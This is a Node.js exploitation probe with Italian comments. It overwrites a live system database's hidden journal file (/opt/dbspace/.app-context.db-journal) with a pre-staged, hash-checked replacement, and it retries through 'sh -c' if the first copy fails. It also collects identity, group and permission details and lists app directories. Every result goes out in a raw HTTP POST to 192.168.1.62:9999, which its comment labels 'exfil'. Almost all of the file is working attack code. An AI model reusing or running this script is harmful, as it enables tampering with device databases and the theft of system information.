"use strict";

/* p76: PLACEMENT DIRECTO via cp (owner, /opt/dbspace e' drwxrwxr-x root:system_share)
   1. md5 staged journal (atteso 03683f81d337ce2224df6010456738e9)
   2. cp staged -> /opt/dbspace/.app-context.db-journal
   3. md5 dst (PLACED se = 03683f81...)
   4. md5 live DB + ls dbspace/apps (stato)
   5. fallback se cp fallisce: cp con sh -c esplicito, poi touch test
   exfil /p76info
 */

var cp = null;
try { cp = require('child_process'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var LIVE = '/opt/dbspace/.app-context.db';
var EXP = '03683f81d337ce2224df6010456738e9';
var R = { ts: new Date().toISOString(), probe: 'p76', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  try {
    var net = require('net');
    var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
    var s = net.connect(PORT, HOST);
    s.setTimeout(120000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 120000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p76info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  if (!cp) return '[no cp]';
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

function md5(p) {
  return run('md5sum ' + p + ' 2>&1; ls -la ' + p + ' 2>&1', 15000, 2000);
}

function main() {
  /* 0. chi sono / permessi */
  R.results.s0_id = run('id; whoami; groups 2>&1', 10000, 500);

  /* 1. staged journal */
  R.results.s1_staged = md5(STAGED);
  L('staged: ' + R.results.s1_staged.substring(0, 200));

  var stagedOk = R.results.s1_staged.indexOf(EXP) >= 0;
  R.results.placed = stagedOk ? 'PENDING' : 'STAGED_MISSING';

  if (stagedOk) {
    /* 2. cp diretto */
    R.results.s2_cp = run('cp ' + STAGED + ' ' + DST + ' 2>&1 && echo CP_OK || echo CP_FAIL', 20000);
    L('cp: ' + R.results.s2_cp.substring(0, 200));

    /* 3. verify dst */
    R.results.s3_dst = md5(DST);
    if (R.results.s3_dst.indexOf(EXP) >= 0) {
      R.results.placed = 'PLACED';
      L('PLACED!');
    } else {
      R.results.placed = 'CP_FAILED';
      /* fallback: sh -c esplicito */
      R.results.s4_cp2 = run('sh -c "cp ' + STAGED + ' ' + DST + '" 2>&1 && echo CP2_OK || echo CP2_FAIL', 20000);
      R.results.s5_dst2 = md5(DST);
      if (R.results.s5_dst2.indexOf(EXP) >= 0) R.results.placed = 'PLACED_FALLBACK';
      else {
        /* diagnostica permessi */
        R.results.s6_perm = run('id; stat -c "%a %U:%G %n" /opt/dbspace /opt/dbspace/.app-context.db 2>&1; touch /opt/dbspace/.p76test 2>&1 && echo TOUCH_OK || echo TOUCH_FAIL; rm -f /opt/dbspace/.p76test 2>&1; cat /etc/group 2>/dev/null | grep -E "system_share|owner" | head -5', 15000);
      }
    }

    /* 4. stato live + dirs */
    R.results.s7_live = md5(LIVE);
    R.results.s8_state = run('ls -la /opt/dbspace/ 2>&1 | head -30; echo ===APPS; ls -la /opt/usr/apps/ 2>&1 | head -20; echo ===APPSRW; ls -la /opt/usr/home/owner/apps_rw/ 2>&1 | head -15', 20000);
  }

  R.results.final = 'done ' + new Date().toISOString() + ' placed=' + R.results.placed;
  L('done placed=' + R.results.placed);
  postFinal();
  setTimeout(postFinal, 15000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
